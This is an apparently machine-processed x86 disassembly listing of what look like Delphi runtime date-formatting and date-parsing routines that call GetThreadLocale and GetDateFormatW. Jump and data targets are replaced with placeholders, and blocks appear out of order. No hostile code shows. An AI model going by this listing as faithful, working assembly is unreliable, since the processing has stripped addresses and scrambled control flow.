lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_413d3c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x20 ]
mov edx 0x10
call sub_412950
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_413c84
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413d88
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
movzx ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cx [ ebx - 0x16 ]
je r-xdata
add [ eax ] 0x2
mov eax [ eax ]
sub eax edx
sar eax 0x1
jns r-xdata
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
pop ebx
pop ebp
retn
adc eax 0x0
sub_413dbc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffe
call sub_413c28
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_413df4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1e ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0xa ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_413978
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1e ] 0x1
sub_413e34
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_413f9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor edx edx
call sub_4070a8
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2 ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x6 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
push 0x100
lea eax [ ebp - 0x214 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatW
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413fa3
lea eax [ ebp - 0x21c ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax ebx
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_407290
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x218 ] eax
mov esi [ ebp - 0x218 ]
test esi esi
je r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_4178ec
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4077d0
jmp r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4174e4
cmp eax 0x4
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebx ]
mov edx 0x3
call sub_4177d4
mov esi eax
add esi esi
lea eax [ ebp - 0x214 ]
add esi eax
sub esi 0x2
lea eax [ ebp - 0x21c ]
mov edx esi
call sub_407254
mov eax [ ebp - 0x21c ]
mov edx 0x2
call sub_4178ec
mov ecx eax
mov eax ebx
mov edx esi
call sub_4071e4
sub_413fc0
push ebp
mov ebp esp
add esp 0xfffffde8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4140b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor edx edx
call sub_4070a8
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2 ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x4 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x6 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4140b8
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax ebx
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_407290
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x214 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatW
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x218 ] eax
mov esi [ ebp - 0x218 ]
test esi esi
je r-xdata
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4077d0
sub esi 0x4
mov esi [ esi ]
sub_4140ed
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_414899
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148a0
lea eax [ ebp - 0x2c ]
mov edx 0x2
call j_sub_4068c4
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x208 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x208 ]
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
mov [ ebp - 0x21 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
movzx edi [ eax ]
test di di
jne r-xdata
mov [ ebp - 0x16 ] di
cmp [ ebp - 0x16 ] 0xd800
jb r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x208 ]
mov eax [ ebp - 0x14 ]
call sub_417924
mov [ ebp - 0x14 ] eax
movzx ebx [ ebp - 0x16 ]
mov eax ebx
add eax 0xffffff9f
sub ax 0x1a
jae r-xdata
cmp [ ebp - 0x16 ] 0xdfff
ja r-xdata
mov eax ebx
add eax 0xffffffbf
sub ax 0x1a
jae r-xdata
sub bx 0x20
mov eax [ ebp - 0x14 ]
call sub_417924
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x20 ] 0x20
jmp r-xdata
movzx eax bx
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp bx 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x16 ]
mov edx 0x1
call sub_413c84
pop ecx
movzx eax [ eax + lookup_table_4141cd ]
jmp [ eax * 4 + jump_table_414206 ]
mov [ ebp - 0x20 ] bx
cmp [ ebp - 0x20 ] 0x48
jne r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413dbc
pop ecx
cmp [ ebp - 0x1c ] 0x2
jg r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
call sub_413e34
pop ecx
mov eax [ ebp - 0x28 ]
call sub_413cc8
pop ecx
jmp r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x1c ]
call sub_413fc0
pop ecx
mov eax [ ebp - 0x2c ]
call sub_413cc8
pop ecx
jmp r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413dbc
pop ecx
mov eax [ ebp - 0x1c ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_413d88
pop ecx
mov eax [ ebp - 0x1c ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413df4
pop ecx
mov [ ebp - 0x22 ] 0x0
mov esi [ ebp - 0x14 ]
jmp r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413df4
pop ecx
cmp [ ebp - 0x1c ] 0x2
jle r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413df4
pop ecx
cmp [ ebp - 0x1c ] 0x2
jle r-xdata
push ebp
call sub_413d88
pop ecx
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
push ebp
call sub_413d88
pop ecx
push ebp
call sub_413df4
pop ecx
cmp [ ebp - 0x1c ] 0x3
jle r-xdata
push ebp
call sub_413df4
pop ecx
mov esi [ ebp - 0x14 ]
sub esi 0x2
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_412730
test eax eax
jne r-xdata
push ebp
call sub_413d88
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4140ec
pop ecx
push ebp
call sub_413df4
pop ecx
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov bx 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
mov edx 0x4
call sub_413d3c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_413d3c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
call sub_413d3c
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_413dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x6 ]
mov edx [ ebp - 0x1c ]
call sub_413d3c
pop ecx
jmp r-xdata
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
mov edx [ ebp - 0x1c ]
call sub_413d3c
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xc ]
mov edx [ ebp - 0x1c ]
call sub_413d3c
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4140ec
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4140ec
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx [ ebp - 0x1c ]
call sub_413d3c
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_412730
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_413c84
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4140ec
pop ecx
jmp r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_413c84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_413c84
pop ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x4 ]
mov eax [ eax * 4 + rw-data ]
call sub_413cc8
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_413c48
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_413cc8
pop ecx
jmp r-xdata
dec eax
je r-xdata
cmp [ esi ] 0xd800
jb r-xdata
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] ax
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_412730
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_413c84
pop ecx
add [ ebp - 0x14 ] 0x8
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
add esi 0x6
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x14 ]
sub edx esi
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax ]
cmp ax [ ebp - 0x16 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x4 ]
mov eax [ eax * 4 + rw-data ]
call sub_413cc8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_413c48
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_413cc8
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
cmp eax 0x48
jg r-xdata
cmp [ esi ] 0xdfff
ja r-xdata
cmp [ ebp - 0x1c ] 0x2
jle r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_412730
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_413c84
pop ecx
add [ ebp - 0x14 ] 0x4
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
add esi 0x4
mov eax esi
call sub_413c84
pop ecx
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
je r-xdata
adc edx 0x0
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0xd800
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4140ec
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov eax esi
call sub_417924
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
call sub_413d3c
pop ecx
jmp r-xdata
mov [ ebp - 0x1c ] 0x2
cmp [ ebp - 0x24 ] 0xc
jbe r-xdata
mov [ ebp - 0x24 ] 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_412730
test eax eax
jne r-xdata
push ebp
call sub_413dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_413c48
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_413cc8
pop ecx
add [ ebp - 0x14 ] 0x6
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_413cc8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_413cc8
pop ecx
jmp r-xdata
add [ ebp - 0x14 ] 0x2
jmp r-xdata
add [ ebp - 0x14 ] 0x2
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0xdfff
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4140ec
pop ecx
jmp r-xdata
cmp [ ebp - 0x22 ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub [ ebp - 0x24 ] 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x16 ]
mov edx 0x1
call sub_413c84
pop ecx
jmp r-xdata
push ebp
call sub_413dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_413c48
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_413cc8
pop ecx
add [ ebp - 0x14 ] 0x4
jmp r-xdata
add [ ebp - 0x14 ] 0x6
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_417924
mov [ ebp - 0x14 ] eax
jmp r-xdata
add esi 0x2
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_412730
test eax eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x22 ]
xor al 0x1
mov [ ebp - 0x22 ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x21 ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_412730
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_412730
test eax eax
jne r-xdata
jmp r-xdata
sub_4148e0
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x204 ] eax
xor eax eax
mov [ ebp - 0x208 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_4140ec
pop ecx
push ebp
mov eax ebx
call sub_4140ec
pop ecx
jmp r-xdata
lea edx [ ebp - 0x200 ]
mov eax esi
mov ecx [ ebp - 0x204 ]
call sub_4071e4
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41493c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41499b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
cmp ebx eax
jg r-xdata
mov [ esi ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149a2
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
call sub_406a60
cmp [ eax + ebx * 2 - 0x2 ] 0x20
je r-xdata
inc ebx
sub_4149a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_414a5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41493c
mov ebx [ edi ]
xor esi esi
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
cmp ebx eax
jg r-xdata
cmp ebx [ edi ]
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ebx * 2 - 0x2 ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a63
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax ebx
mov edx [ edi ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov [ edi ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx * 2 - 0x2 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_414a70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_414b3d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b44
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41493c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx [ esi ]
mov ecx edi
mov eax [ ebp - 0x8 ]
call sub_4077d0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_411254
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add [ esi ] eax
mov bl 0x1
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_414b50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_414bea
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41493c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax [ esi ]
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bf1
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
cmp di [ eax + edx * 2 - 0x2 ]
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc [ esi ]
mov bl 0x1
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_414bfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_414c83
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov esi 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
cmp esi eax
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + esi * 2 - 0x2 ]
and ax 0xdf
sub ax 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c8a
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov bl 0x2
jmp r-xdata
sub ax 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub ax 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc esi
sub_414c94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_414d47
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
cmp eax [ ebx ]
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d4e
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
movzx eax [ edx + eax * 2 - 0x2 ]
add eax 0xffffffd0
sub ax 0xa
jae r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebx ]
movzx edi [ esi + eax * 2 - 0x2 ]
cmp di 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
cmp di 0xdfff
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al 0x1
inc [ ebx ]
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
call sub_4179e8
mov [ ebx ] eax
jmp r-xdata
sub_414d58
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_407134
push eax
mov eax [ ebx ]
call sub_407134
pop edx
call sub_417c74
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_414dac
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_413c70
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_414e08
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_415189
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov [ ebp - 0x1a ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x11 ] 0x0
mov eax [ rw-data ]
call sub_414bfc
mov [ ebp - 0x12 ] al
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax ] 0x67
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_417b94
test eax eax
jle r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414c94
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_4077d0
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0xc ]
call sub_411320
mov eax [ ebp - 0xc ]
call sub_414d58
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax rw-data
mov edx [ rw-data ]
call sub_406a50
lea eax [ ebp - 0x1d ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4149a8
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415190
lea eax [ ebp - 0x2c ]
mov edx 0x3
call j_sub_4068c4
lea eax [ ebp - 0xc ]
mov edx 0x2
call j_sub_4068c4
retn
mov edx ebx
movzx ecx [ rw-data ]
mov eax [ ebp - 0x8 ]
call sub_414b50
test al al
je r-xdata
